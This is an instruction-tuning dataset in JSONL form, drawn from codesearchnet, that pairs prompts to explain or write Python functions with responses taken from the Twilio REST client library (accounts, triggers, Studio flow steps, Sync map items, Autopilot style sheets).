{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, capacity=values.unset, available=values.unset):\n        return self._proxy.update(capacity=capacity, available=available, )", "response": "Update the WorkerChannelInstance\n\n        :param unicode capacity: The total number of Tasks worker should handle for this TaskChannel type.\n        :param bool available: Toggle the availability of the WorkerChannel.\n\n        :returns: Updated WorkerChannelInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create(self, friendly_name=values.unset):\n        data = values.of({'FriendlyName': friendly_name, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AccountInstance(self._version, payload, )", "response": "Create a new AccountInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef addresses(self):\n        if self._addresses is None:\n            self._addresses = AddressList(self._version, account_sid=self._solution['sid'], )\n        return self._addresses", "response": "Access the addresses\n\n        :returns: twilio.rest.api.v2010.account.address.AddressList\n        :rtype: twilio.rest.api.v2010.account.address.AddressList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef applications(self):\n        if self._applications is None:\n            self._applications = ApplicationList(self._version, account_sid=self._solution['sid'], )\n        return self._applications", "response": "Access the applications\n\n        :returns: twilio.rest.api.v2010.account.application.ApplicationList\n        :rtype: twilio.rest.api.v2010.account.application.ApplicationList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the authorized_connect_apps :returns: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppList :rtype: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppList", "response": "def authorized_connect_apps(self):\n        \"\"\"\n        Access the authorized_connect_apps\n\n        :returns: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppList\n        :rtype: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppList\n        \"\"\"\n        if self._authorized_connect_apps is None:\n            self._authorized_connect_apps = AuthorizedConnectAppList(\n                self._version,\n                account_sid=self._solution['sid'],\n            )\n        return self._authorized_connect_apps"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef available_phone_numbers(self):\n        if self._available_phone_numbers is None:\n            self._available_phone_numbers = AvailablePhoneNumberCountryList(\n                self._version,\n                account_sid=self._solution['sid'],\n            )\n        return self._available_phone_numbers", "response": "Access the available_phone_numbers\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.AvailablePhoneNumberCountryList\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.AvailablePhoneNumberCountryList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef balance(self):\n        if self._balance is None:\n            self._balance = BalanceList(self._version, account_sid=self._solution['sid'], )\n        return self._balance", "response": "Access the balance\n\n        :returns: twilio.rest.api.v2010.account.balance.BalanceList\n        :rtype: twilio.rest.api.v2010.account.balance.BalanceList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the calls :returns: twilio.rest.api.v2010.account.call.CallList :rtype: twilio.rest.api.v2010.account.call.CallList", "response": "def calls(self):\n        \"\"\"\n        Access the calls\n\n        :returns: twilio.rest.api.v2010.account.call.CallList\n        :rtype: twilio.rest.api.v2010.account.call.CallList\n        \"\"\"\n        if self._calls is None:\n            self._calls = CallList(self._version, account_sid=self._solution['sid'], )\n        return self._calls"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef conferences(self):\n        if self._conferences is None:\n            self._conferences = ConferenceList(self._version, account_sid=self._solution['sid'], )\n        return self._conferences", "response": "Access the conferences\n\n        :returns: twilio.rest.api.v2010.account.conference.ConferenceList\n        :rtype: twilio.rest.api.v2010.account.conference.ConferenceList"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the connect_apps :returns: twilio.rest.api.v2010.account.connect_app.ConnectAppList :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppList", "response": "def connect_apps(self):\n        \"\"\"\n        Access the connect_apps\n\n        :returns: twilio.rest.api.v2010.account.connect_app.ConnectAppList\n        :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppList\n        \"\"\"\n        if self._connect_apps is None:\n            self._connect_apps = ConnectAppList(self._version, account_sid=self._solution['sid'], )\n        return self._connect_apps"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the incoming_phone_numbers :returns: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberList :rtype: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberList", "response": "def incoming_phone_numbers(self):\n        \"\"\"\n        Access the incoming_phone_numbers\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberList\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberList\n        \"\"\"\n        if self._incoming_phone_numbers is None:\n            self._incoming_phone_numbers = IncomingPhoneNumberList(\n                self._version,\n                account_sid=self._solution['sid'],\n            )\n        return self._incoming_phone_numbers"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef keys(self):\n        if self._keys is None:\n            self._keys = KeyList(self._version, account_sid=self._solution['sid'], )\n        return self._keys", "response": "Access the keys\n\n        :returns: twilio.rest.api.v2010.account.key.KeyList\n        :rtype: twilio.rest.api.v2010.account.key.KeyList"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef messages(self):\n        if self._messages is None:\n            self._messages = MessageList(self._version, account_sid=self._solution['sid'], )\n        return self._messages", "response": "Access the messages\n\n        :returns: twilio.rest.api.v2010.account.message.MessageList\n        :rtype: twilio.rest.api.v2010.account.message.MessageList"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef new_keys(self):\n        if self._new_keys is None:\n            self._new_keys = NewKeyList(self._version, account_sid=self._solution['sid'], )\n        return self._new_keys", "response": "Access the new_keys\n\n        :returns: twilio.rest.api.v2010.account.new_key.NewKeyList\n        :rtype: twilio.rest.api.v2010.account.new_key.NewKeyList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the new_signing_keys :returns: twilio.rest.api.v2010.account.new_signing_key.NewSigningKeyList :rtype: twilio.rest.api.v2010.account.new_signing_key.NewSigningKeyList", "response": "def new_signing_keys(self):\n        \"\"\"\n        Access the new_signing_keys\n\n        :returns: twilio.rest.api.v2010.account.new_signing_key.NewSigningKeyList\n        :rtype: twilio.rest.api.v2010.account.new_signing_key.NewSigningKeyList\n        \"\"\"\n        if self._new_signing_keys is None:\n            self._new_signing_keys = NewSigningKeyList(self._version, account_sid=self._solution['sid'], )\n        return self._new_signing_keys"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\naccesses the notifications :returns: twilio.rest.api.v2010.account.notification.NotificationList :rtype: twilio.rest.api.v2010.account.notification.NotificationList", "response": "def notifications(self):\n        \"\"\"\n        Access the notifications\n\n        :returns: twilio.rest.api.v2010.account.notification.NotificationList\n        :rtype: twilio.rest.api.v2010.account.notification.NotificationList\n        \"\"\"\n        if self._notifications is None:\n            self._notifications = NotificationList(self._version, account_sid=self._solution['sid'], )\n        return self._notifications"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the outgoing_caller_ids :returns: twilio.rest.api.v2010.account.outgoing_caller_id.OutgoingCallerIdList :rtype: twilio.rest.api.v2010.account.outgoing_caller_id.OutgoingCallerIdList", "response": "def outgoing_caller_ids(self):\n        \"\"\"\n        Access the outgoing_caller_ids\n\n        :returns: twilio.rest.api.v2010.account.outgoing_caller_id.OutgoingCallerIdList\n        :rtype: twilio.rest.api.v2010.account.outgoing_caller_id.OutgoingCallerIdList\n        \"\"\"\n        if self._outgoing_caller_ids is None:\n            self._outgoing_caller_ids = OutgoingCallerIdList(self._version, account_sid=self._solution['sid'], )\n        return self._outgoing_caller_ids"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the queues :returns: twilio.rest.api.v2010.account.queue.QueueList :rtype: twilio.rest.api.v2010.account.queue.QueueList", "response": "def queues(self):\n        \"\"\"\n        Access the queues\n\n        :returns: twilio.rest.api.v2010.account.queue.QueueList\n        :rtype: twilio.rest.api.v2010.account.queue.QueueList\n        \"\"\"\n        if self._queues is None:\n            self._queues = QueueList(self._version, account_sid=self._solution['sid'], )\n        return self._queues"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef signing_keys(self):\n        if self._signing_keys is None:\n            self._signing_keys = SigningKeyList(self._version, account_sid=self._solution['sid'], )\n        return self._signing_keys", "response": "Access the signing_keys\n\n        :returns: twilio.rest.api.v2010.account.signing_key.SigningKeyList\n        :rtype: twilio.rest.api.v2010.account.signing_key.SigningKeyList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\naccess the sip :returns: twilio.rest.api.v2010.account.sip.SipList :rtype: twilio.rest.api.v2010.account.sip.SipList", "response": "def sip(self):\n        \"\"\"\n        Access the sip\n\n        :returns: twilio.rest.api.v2010.account.sip.SipList\n        :rtype: twilio.rest.api.v2010.account.sip.SipList\n        \"\"\"\n        if self._sip is None:\n            self._sip = SipList(self._version, account_sid=self._solution['sid'], )\n        return self._sip"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the short_codes :returns: twilio.rest.api.v2010.account.short_code.ShortCodeList :rtype: twilio.rest.api.v2010.account.short_code.ShortCodeList", "response": "def short_codes(self):\n        \"\"\"\n        Access the short_codes\n\n        :returns: twilio.rest.api.v2010.account.short_code.ShortCodeList\n        :rtype: twilio.rest.api.v2010.account.short_code.ShortCodeList\n        \"\"\"\n        if self._short_codes is None:\n            self._short_codes = ShortCodeList(self._version, account_sid=self._solution['sid'], )\n        return self._short_codes"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the tokens :returns: twilio.rest.api.v2010.account.token.TokenList :rtype: twilio.rest.api.v2010.account.token.TokenList", "response": "def tokens(self):\n        \"\"\"\n        Access the tokens\n\n        :returns: twilio.rest.api.v2010.account.token.TokenList\n        :rtype: twilio.rest.api.v2010.account.token.TokenList\n        \"\"\"\n        if self._tokens is None:\n            self._tokens = TokenList(self._version, account_sid=self._solution['sid'], )\n        return self._tokens"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the transcriptions :returns: twilio.rest.api.v2010.account.transcription.TranscriptionList :rtype: twilio.rest.api.v2010.account.transcription.TranscriptionList", "response": "def transcriptions(self):\n        \"\"\"\n        Access the transcriptions\n\n        :returns: twilio.rest.api.v2010.account.transcription.TranscriptionList\n        :rtype: twilio.rest.api.v2010.account.transcription.TranscriptionList\n        \"\"\"\n        if self._transcriptions is None:\n            self._transcriptions = TranscriptionList(self._version, account_sid=self._solution['sid'], )\n        return self._transcriptions"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\naccessing the usage :returns: twilio.rest.api.v2010.account.usage.UsageList :rtype: twilio.rest.api.v2010.account.usage.UsageList", "response": "def usage(self):\n        \"\"\"\n        Access the usage\n\n        :returns: twilio.rest.api.v2010.account.usage.UsageList\n        :rtype: twilio.rest.api.v2010.account.usage.UsageList\n        \"\"\"\n        if self._usage is None:\n            self._usage = UsageList(self._version, account_sid=self._solution['sid'], )\n        return self._usage"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef validation_requests(self):\n        if self._validation_requests is None:\n            self._validation_requests = ValidationRequestList(self._version, account_sid=self._solution['sid'], )\n        return self._validation_requests", "response": "Access the validation_requests\n\n        :returns: twilio.rest.api.v2010.account.validation_request.ValidationRequestList\n        :rtype: twilio.rest.api.v2010.account.validation_request.ValidationRequestList"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the resource", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AccountContext for this AccountInstance\n        :rtype: twilio.rest.api.v2010.account.AccountContext\n        \"\"\"\n        if self._context is None:\n            self._context = AccountContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nupdating the AccountInstance with the specified friendly_name and status.", "response": "def update(self, friendly_name=values.unset, status=values.unset):\n        \"\"\"\n        Update the AccountInstance\n\n        :param unicode friendly_name: FriendlyName to update\n        :param AccountInstance.Status status: Status to update the Account with\n\n        :returns: Updated AccountInstance\n        :rtype: twilio.rest.api.v2010.account.AccountInstance\n        \"\"\"\n        return self._proxy.update(friendly_name=friendly_name, status=status, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the FlowList Twilio Domain", "response": "def flows(self):\n        \"\"\"\n        :rtype: twilio.rest.studio.v1.flow.FlowList\n        \"\"\"\n        if self._flows is None:\n            self._flows = FlowList(self)\n        return self._flows"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, phone_number, friendly_name=values.unset,\n               call_delay=values.unset, extension=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset):\n        \"\"\"\n        Create a new ValidationRequestInstance\n\n        :param unicode phone_number: The phone number to verify in E.164 format\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode call_delay: The number of seconds to delay before initiating the verification call\n        :param unicode extension: The digits to dial after connecting the verification call\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode status_callback_method: The HTTP method we should use to call status_callback\n\n        :returns: Newly created ValidationRequestInstance\n        :rtype: twilio.rest.api.v2010.account.validation_request.ValidationRequestInstance\n        \"\"\"\n        data = values.of({\n            'PhoneNumber': phone_number,\n            'FriendlyName': friendly_name,\n            'CallDelay': call_delay,\n            'Extension': extension,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ValidationRequestInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Create a new ValidationRequestInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return ValidationRequestInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of ValidationRequestInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconstructing a ExecutionStepContext :param sid: Step Sid. :returns: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepContext :rtype: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ExecutionStepContext\n\n        :param sid: Step Sid.\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepContext\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepContext\n        \"\"\"\n        return ExecutionStepContext(\n            self._version,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of ExecutionStepInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ExecutionStepInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepInstance\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepInstance\n        \"\"\"\n        return ExecutionStepInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nfetch a ExecutionStepInstance :returns: Fetched ExecutionStepInstance :rtype: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a ExecutionStepInstance\n\n        :returns: Fetched ExecutionStepInstance\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ExecutionStepInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\naccessing the step_context :returns: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextList :rtype: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextList", "response": "def step_context(self):\n        \"\"\"\n        Access the step_context\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextList\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextList\n        \"\"\"\n        if self._step_context is None:\n            self._step_context = ExecutionStepContextList(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                execution_sid=self._solution['execution_sid'],\n                step_sid=self._solution['sid'],\n            )\n        return self._step_context"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = ExecutionStepContext(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                execution_sid=self._solution['execution_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of StyleSheetInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of StyleSheetInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetInstance\n        \"\"\"\n        return StyleSheetInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return StyleSheetInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )", "response": "Fetch a StyleSheetInstance\n\n        :returns: Fetched StyleSheetInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the StyleSheetInstance :param dict style_sheet: The JSON string that describes the style sheet object :returns: Updated StyleSheetInstance :rtype: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetInstance", "response": "def update(self, style_sheet=values.unset):\n        \"\"\"\n        Update the StyleSheetInstance\n\n        :param dict style_sheet: The JSON string that describes the style sheet object\n\n        :returns: Updated StyleSheetInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetInstance\n        \"\"\"\n        data = values.of({'StyleSheet': serialize.object(style_sheet), })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return StyleSheetInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = StyleSheetContext(self._version, assistant_sid=self._solution['assistant_sid'], )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, style_sheet=values.unset):\n        return self._proxy.update(style_sheet=style_sheet, )", "response": "Update the StyleSheetInstance\n\n        :param dict style_sheet: The JSON string that describes the style sheet object\n\n        :returns: Updated StyleSheetInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, key, data, ttl=values.unset, item_ttl=values.unset,\n               collection_ttl=values.unset):\n        \"\"\"\n        Create a new SyncMapItemInstance\n\n        :param unicode key: The unique user-defined key of this Map Item.\n        :param dict data: Contains arbitrary user-defined, schema-less data that this Map Item stores, represented by a JSON object, up to 16KB.\n        :param unicode ttl: Alias for item_ttl\n        :param unicode item_ttl: Time-to-live of this item in seconds, defaults to no expiration.\n        :param unicode collection_ttl: Time-to-live of this item's parent Map in seconds, defaults to no expiration.\n\n        :returns: Newly created SyncMapItemInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_item.SyncMapItemInstance\n        \"\"\"\n        data = values.of({\n            'Key': key,\n            'Data': serialize.object(data),\n            'Ttl': ttl,\n            'ItemTtl': item_ttl,\n            'CollectionTtl': collection_ttl,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SyncMapItemInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n        )", "response": "Create a new SyncMapItemInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the SyncMapItemInstance :param dict data: Contains an arbitrary JSON object to be stored in this Map Item. :param unicode ttl: Alias for item_ttl :param unicode item_ttl: Time-to-live of this item in seconds, defaults to no expiration. :param unicode collection_ttl: Time-to-live of this item's parent Map in seconds, defaults to no expiration. :returns: Updated SyncMapItemInstance :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_item.SyncMapItemInstance", "response": "def update(self, data=values.unset, ttl=values.unset, item_ttl=values.unset,\n               collection_ttl=values.unset):\n        \"\"\"\n        Update the SyncMapItemInstance\n\n        :param dict data: Contains an arbitrary JSON object to be stored in this Map Item.\n        :param unicode ttl: Alias for item_ttl\n        :param unicode item_ttl: Time-to-live of this item in seconds, defaults to no expiration.\n        :param unicode collection_ttl: Time-to-live of this item's parent Map in seconds, defaults to no expiration.\n\n        :returns: Updated SyncMapItemInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_item.SyncMapItemInstance\n        \"\"\"\n        return self._proxy.update(data=data, ttl=ttl, item_ttl=item_ttl, collection_ttl=collection_ttl, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return NationalInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            country_code=self._solution['country_code'],\n        )", "response": "Build an instance of NationalInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create(self, callback_url, trigger_value, usage_category,\n               callback_method=values.unset, friendly_name=values.unset,\n               recurring=values.unset, trigger_by=values.unset):\n        \"\"\"\n        Create a new TriggerInstance\n\n        :param unicode callback_url: The URL we call when the trigger fires\n        :param unicode trigger_value: The usage value at which the trigger should fire\n        :param TriggerInstance.UsageCategory usage_category: The usage category the trigger watches\n        :param unicode callback_method: The HTTP method to use to call callback_url\n        :param unicode friendly_name: A string to describe the resource\n        :param TriggerInstance.Recurring recurring: The frequency of a recurring UsageTrigger\n        :param TriggerInstance.TriggerField trigger_by: The field in the UsageRecord resource that fires the trigger\n\n        :returns: Newly created TriggerInstance\n        :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerInstance\n        \"\"\"\n        data = values.of({\n            'CallbackUrl': callback_url,\n            'TriggerValue': trigger_value,\n            'UsageCategory': usage_category,\n            'CallbackMethod': callback_method,\n            'FriendlyName': friendly_name,\n            'Recurring': recurring,\n            'TriggerBy': trigger_by,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TriggerInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Create a new TriggerInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef stream(self, recurring=values.unset, trigger_by=values.unset,\n               usage_category=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams TriggerInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param TriggerInstance.Recurring recurring: The frequency of recurring UsageTriggers to read\n        :param TriggerInstance.TriggerField trigger_by: The trigger field of the UsageTriggers to read\n        :param TriggerInstance.UsageCategory usage_category: The usage category of the UsageTriggers to read\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.usage.trigger.TriggerInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            recurring=recurring,\n            trigger_by=trigger_by,\n            usage_category=usage_category,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams TriggerInstance records from the API as a generator."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef list(self, recurring=values.unset, trigger_by=values.unset,\n             usage_category=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists TriggerInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param TriggerInstance.Recurring recurring: The frequency of recurring UsageTriggers to read\n        :param TriggerInstance.TriggerField trigger_by: The trigger field of the UsageTriggers to read\n        :param TriggerInstance.UsageCategory usage_category: The usage category of the UsageTriggers to read\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.usage.trigger.TriggerInstance]\n        \"\"\"\n        return list(self.stream(\n            recurring=recurring,\n            trigger_by=trigger_by,\n            usage_category=usage_category,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams the TriggerInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving a single page of TriggerInstance records from the API. Request is executed immediately", "response": "def page(self, recurring=values.unset, trigger_by=values.unset,\n             usage_category=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of TriggerInstance records from the API.\n        Request is executed immediately\n\n        :param TriggerInstance.Recurring recurring: The frequency of recurring UsageTriggers to read\n        :param TriggerInstance.TriggerField trigger_by: The trigger field of the UsageTriggers to read\n        :param TriggerInstance.UsageCategory usage_category: The usage category of the UsageTriggers to read\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of TriggerInstance\n        :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerPage\n        \"\"\"\n        params = values.of({\n            'Recurring': recurring,\n            'TriggerBy': trigger_by,\n            'UsageCategory': usage_category,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return TriggerPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconstructs a TriggerContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.usage.trigger.TriggerContext :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a TriggerContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.usage.trigger.TriggerContext\n        :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerContext\n        \"\"\"\n        return TriggerContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return TriggerInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of TriggerInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the TriggerInstance :param unicode callback_method: The HTTP method to use to call callback_url :param unicode callback_url: The URL we call when the trigger fires :param unicode friendly_name: A string to describe the resource :returns: Updated TriggerInstance :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerInstance", "response": "def update(self, callback_method=values.unset, callback_url=values.unset,\n               friendly_name=values.unset):\n        \"\"\"\n        Update the TriggerInstance\n\n        :param unicode callback_method: The HTTP method to use to call callback_url\n        :param unicode callback_url: The URL we call when the trigger fires\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Updated TriggerInstance\n        :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerInstance\n        \"\"\"\n        data = values.of({\n            'CallbackMethod': callback_method,\n            'CallbackUrl': callback_url,\n            'FriendlyName': friendly_name,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TriggerInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = TriggerContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
